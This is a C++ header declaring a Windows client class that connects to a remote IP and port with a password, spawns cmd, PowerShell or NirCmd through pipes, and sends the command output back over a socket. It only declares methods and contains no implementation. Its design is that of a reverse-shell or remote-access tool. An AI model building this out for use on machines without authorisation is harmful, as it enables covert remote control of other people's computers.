#pragma once
#include "pch.h"
using namespace std;
typedef bool (WINAPI *cmd_type)(LPSTR);
enum prompt { CommandPrompt = 1, PowerShell = 2, NirCmd = 4, None = 8 }; //must be in base 2 for bitwise and(&) to be working

class client {
private:
	bool initilize_process(string path, string working_directory);
	bool active = false;
	bool force_quit = false;
	bool nirsoft = false;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_info;
	SECURITY_ATTRIBUTES security_atrib;
	cmd_type nirsofter;
	string custom_esc = "";
	string nircmd_keyword = "nircmd";
	HANDLE STDINR;
	HANDLE STDINW;
	HANDLE STDOUTR;
	HANDLE STDOUTW;
	DWORD pipe_size;
	DWORD sleep_delay;
	int active_prompt;

	WSAData wsa_data;
	WORD wsa_version;
	SOCKET active_socket;
	sockaddr_in socket_hint;
	bool alive = false;
	string connect_password = "";

public:

	client(string ip, int port, string password);

	string hostname2ip(string host);
	void data_parser(string type, int size, string command);
	bool startup_socket(string ip_address, int port, WSADATA &wsa_data, WORD &version, SOCKET &active, sockaddr_in &socket_hint);
	bool connect_socket(SOCKET &active, sockaddr_in &hint);
	bool connect_socket();
	bool check_error(int status);
	bool get_alive_client();
	bool send_data(string data = "", string header = "RESP");
	bool recv_data(string &output);
	bool recv_data(string & type_h, string & data_h);
	void endme();

	void cmd_init(int type = None, bool output = true, int delay = 10, int pipe_size = 1000000);
	void Sömn();
	void terminate_open();
	void set_delay(int delay);
	void set_pipe_size(int size);
	void set_custom_esc(string escape);
	bool write_cmd(CString command, int &length);
	bool read_cmd(string command, int length, string &output);
	bool read_and_send(string command = "", int length = 0);
	bool read_cmd(string command, int length);
	void initilize_nirsoft();
	void initilize_custom(string path, string working_directory, string esc, bool output = true);
	void initilize_cmd(bool output = true);
	void initilize_ps(bool output = true);
	void nircmd(string command, bool &output);
	void command(string command = "");
	bool alive_cmd();
	void endme_cmd();
	bool get_alive_cmd();
	bool nircmd_presence(string command);
};